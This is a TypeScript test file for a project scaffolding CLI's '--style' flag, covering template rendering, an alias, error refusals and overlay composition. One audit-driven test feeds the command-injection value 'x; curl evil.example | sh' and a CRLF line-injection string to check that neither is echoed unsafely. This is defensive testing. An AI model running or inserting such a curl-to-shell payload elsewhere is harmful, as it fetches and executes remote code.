/**
 * The `--style` flag, end to end through `runNewCommand`.
 *
 * `composeHost` and `resolveTemplateChoice` are covered in their own tests;
 * this file drives the COMMAND: that a styled scaffold actually renders the
 * decorated artifacts, that the alias is byte-identical and announces itself,
 * that every refusal fires with its message, and that the broker and queue
 * overlays compose with the class-based host (C5).
 *
 * @module
 */
import { describe, it } from '@std/testing/bdd';
import { expect } from '@std/expect';
import { createFakeFs, createRecorder } from '../fixtures/fake-fs.ts';
import { parseArgs } from '../../src/args.ts';
import { runNewCommand } from '../../src/commands/new.ts';

interface Harness {
  readonly fs: ReturnType<typeof createFakeFs>;
  run(argv: readonly string[]): Promise<number>;
  errText(): string;
  logText(): string;
}

function harness(seed: Readonly<Record<string, string>> = {}): Harness {
  const fs = createFakeFs(seed);
  const err = createRecorder();
  const log = createRecorder();
  return {
    fs,
    errText: () => err.text(),
    logText: () => log.text(),
    run: (argv) =>
      runNewCommand(parseArgs(argv), {
        fs,
        cwd: '/work',
        log: log.sink,
        error: err.sink,
      }),
  };
}

/** Every file a scaffold wrote, as a path → contents map. */
function written(h: Harness): Record<string, string> {
  const out: Record<string, string> = {};
  for (const path of h.fs.writes) out[path] = h.fs.read(path);
  return out;
}

describe('--style class-based on a styleable template (C1)', () => {
  it('renders the decorated showcase and the DI pair', async () => {
    const h = harness();
    expect(await h.run(['svc', '--template', 'rest', '--style', 'class-based'])).toBe(0);
    const config = h.fs.read('/work/svc/setu.config.ts');
    // The decorator and DI pair are both installed.
    expect(config).toContain('DecoratorPlugin');
    expect(config).toContain('DiPlugin');
    expect(config).toContain('@setu-ts/decorator-plugin');
    expect(config).toContain('@setu-ts/di-plugin');
    // The showcase is the decorated controller and injected service.
    const service = h.fs.read('/work/svc/src/services/greeting.service.ts');
    expect(service).toContain('@Injectable');
    const controller = h.fs.read('/work/svc/src/controllers/greeting.controller.ts');
    expect(controller).toContain('@Controller');
    expect(controller).toContain('@Inject');
  });

  it('renders the functional showcase without a style', async () => {
    const h = harness();
    expect(await h.run(['svc', '--template', 'rest'])).toBe(0);
    const config = h.fs.read('/work/svc/setu.config.ts');
    expect(config).not.toContain('DecoratorPlugin');
    expect(config).not.toContain('DiPlugin');
    const service = h.fs.read('/work/svc/src/services/greeting.service.ts');
    expect(service).not.toContain('@Injectable');
  });

  it('composes with microservice too', async () => {
    const h = harness();
    expect(await h.run(['svc', '--template', 'microservice', '--style', 'class-based'])).toBe(0);
    const config = h.fs.read('/work/svc/setu.config.ts');
    expect(config).toContain('DecoratorPlugin');
    expect(config).toContain('DiPlugin');
    // The microservice additions are still there.
    expect(config).toContain('CqrsPlugin');
    expect(config).toContain('EventsPlugin');
  });
});

describe('the class-based alias (C2)', () => {
  it('is byte-identical to rest --style class-based', async () => {
    const alias = harness();
    expect(await alias.run(['svc', '--template', 'class-based'])).toBe(0);
    const styled = harness();
    expect(await styled.run(['svc', '--template', 'rest', '--style', 'class-based'])).toBe(0);
    // The whole scaffold, file for file.
    expect(written(alias)).toEqual(written(styled));
  });

  it('announces the canonical spelling once, and never as an error', async () => {
    const h = harness();
    expect(await h.run(['svc', '--template', 'class-based'])).toBe(0);
    expect(h.logText()).toContain('--template class-based is an alias of');
    expect(h.logText()).toContain('--template rest --style class-based');
    expect(h.errText()).toBe('');
  });
});

describe('style refusals', () => {
  it('refuses a style with no template to apply to', async () => {
    const h = harness();
    expect(await h.run(['svc', '--style', 'class-based'])).toBe(2);
    expect(h.errText()).toContain('--style applies to a styleable template');
    expect(h.errText()).toContain('--template rest or --template microservice');
  });

  it('refuses an unknown style', async () => {
    const h = harness();
    expect(await h.run(['svc', '--template', 'rest', '--style', 'imperative'])).toBe(2);
    expect(h.errText()).toContain('Unknown style "imperative"');
    expect(h.errText()).toContain('functional, class-based');
  });

  it('refuses class-based on full-stack', async () => {
    const h = harness();
    expect(await h.run(['svc', '--template', 'full-stack', '--style', 'class-based'])).toBe(2);
    expect(h.errText()).toContain('cannot apply to --template full-stack');
    expect(h.errText()).toContain('starter');
  });

  it('refuses functional on the class-based alias', async () => {
    const h = harness();
    expect(await h.run(['svc', '--template', 'class-based', '--style', 'functional'])).toBe(2);
    expect(h.errText()).toContain('--template class-based is --template rest --style class-based');
    expect(h.errText()).toContain('use --template rest');
  });

  it('accepts functional on a styleable template', async () => {
    const h = harness();
    expect(await h.run(['svc', '--template', 'rest', '--style', 'functional'])).toBe(0);
    const config = h.fs.read('/work/svc/setu.config.ts');
    expect(config).not.toContain('DecoratorPlugin');
  });

  it('accepts class-based on the alias (redundant, not an error)', async () => {
    const h = harness();
    expect(await h.run(['svc', '--template', 'class-based', '--style', 'class-based'])).toBe(0);
    expect(h.logText()).toContain('is an alias of');
  });
});

describe('the retired --di flag (C4)', () => {
  it('refuses with the new style wording on a standalone project', async () => {
    const h = harness();
    expect(await h.run(['svc', '--di'])).toBe(2);
    expect(h.errText()).toContain('no longer supported');
    expect(h.errText()).toContain('--style class-based');
  });

  it('refuses with the new style wording on a workspace root', async () => {
    const h = harness();
    expect(await h.run(['ws', '--workspace', '--di'])).toBe(2);
    expect(h.errText()).toContain('no longer supported');
    expect(h.errText()).toContain('--style class-based');
  });
});

describe('a workspace root refuses --style', () => {
  it('names the generate command that honours it', async () => {
    const h = harness();
    expect(await h.run(['ws', '--workspace', '--style', 'class-based'])).toBe(2);
    expect(h.errText()).toContain('A workspace root registers no plugins');
    expect(h.errText()).toContain('generate app');
    expect(h.errText()).toContain('--template rest --style class-based');
  });

  // Audit F1: the value was echoed raw into a command the developer is told to
  // copy, so a CI job building argv from untrusted data could put a shell
  // payload in the suggestion. An unknown value is not echoed into it at all.
  for (const flag of ['--style', '--template']) {
    it(`never echoes an unknown ${flag} value into the suggested command`, async () => {
      const h = harness();
      expect(await h.run(['ws', '--workspace', flag, 'x; curl evil.example | sh'])).toBe(2);
      // The suggested command is the backtick-quoted span; the payload must not
      // be in it (quoting it back, escaped, in the prose is fine).
      const command = h.errText().match(/`([^`]*)`/)?.[1] ?? '';
      expect(command).toContain('generate app');
      expect(command).not.toContain('curl');
    });
  }

  it('renders control characters in an unknown value as escapes, keeping it one line', async () => {
    const h = harness();
    expect(await h.run(['ws', '--workspace', '--style', 'oop\r\nINJECTED: done'])).toBe(2);
    expect(h.errText().includes('\r') || h.errText().includes(String.fromCharCode(27))).toBe(false);
    expect(h.errText().split('\n').filter((line) => line.includes('INJECTED'))).toHaveLength(1);
    expect(h.errText()).toContain('\\u000d\\u000a');
  });
});

describe('the broker and queue overlays compose with the styled host (C5)', () => {
  // Only microservice registers the messaging and queue plugins; rest does not,
  // so these overlays apply to the styled MICROSERVICE host.
  it('applies --broker to a class-based microservice project', async () => {
    const h = harness();
    expect(
      await h.run([
        'svc',
        '--template',
        'microservice',
        '--style',
        'class-based',
        '--broker',
        'redis',
      ]),
    ).toBe(0);
    const config = h.fs.read('/work/svc/setu.config.ts');
    // Both the overlay and the style are present.
    expect(config).toContain("broker: 'redis-streams'");
    expect(config).toContain('DecoratorPlugin');
    expect(config).toContain('DiPlugin');
  });

  it('applies --queue to a class-based microservice project', async () => {
    const h = harness();
    expect(
      await h.run([
        'svc',
        '--template',
        'microservice',
        '--style',
        'class-based',
        '--queue',
        'redis',
      ]),
    ).toBe(0);
    const config = h.fs.read('/work/svc/setu.config.ts');
    expect(config).toContain("adapter: 'redis'");
    expect(config).toContain('DecoratorPlugin');
  });

  it('still refuses a broker on a template with no messaging wiring', async () => {
    // rest registers no messaging-plugin, so the styled rest host is refused
    // with the C5 text, now naming the style.
    const h = harness();
    expect(
      await h.run(['svc', '--template', 'rest', '--style', 'class-based', '--broker', 'redis']),
    ).toBe(2);
    expect(h.errText()).toContain('has nothing to configure');
    expect(h.errText()).toContain('--style class-based for decorators');
  });
});
